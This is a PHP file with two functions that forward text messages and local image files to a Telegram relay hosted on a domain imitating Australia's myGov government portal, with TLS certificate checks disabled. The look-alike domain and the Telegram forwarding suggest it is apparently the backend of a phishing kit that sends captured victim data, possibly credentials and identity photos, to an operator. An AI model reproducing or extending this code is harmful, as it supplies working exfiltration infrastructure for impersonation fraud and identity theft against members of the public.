<?php

// Text-only function (unchanged)
function send_telegram_msg($message) {
    $apiUrl = 'https://my-gov-au.vercel.app/api/send-telegram';

    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['message' => $message]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For testing; remove in prod if possible

    $response = curl_exec($ch);
    curl_close($ch);

    // Optional: Check $response for errors
    return true;
}

// Updated photo function (handles multiple files)
function send_telegram_img($message, $imgArr) {
    $apiUrl = 'https://my-gov-au.vercel.app/api/send-telegram';

    $ch = curl_init($apiUrl);

    // Prepare multipart data
    $postFields = [
        'message' => $message,
    ];

    // Add files as 'photos[@file_path;type=mime/type]'
    foreach ($imgArr as $index => $filePath) {
        if (file_exists($filePath)) {
            $mimeType = mime_content_type($filePath);
            $postFields['photos[' . $index . ']'] = curl_file_create($filePath, $mimeType, basename($filePath));
        }
    }

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For testing

    $response = curl_exec($ch);
    curl_close($ch);

    // Optional: Check $response for errors
    return true;
}

?>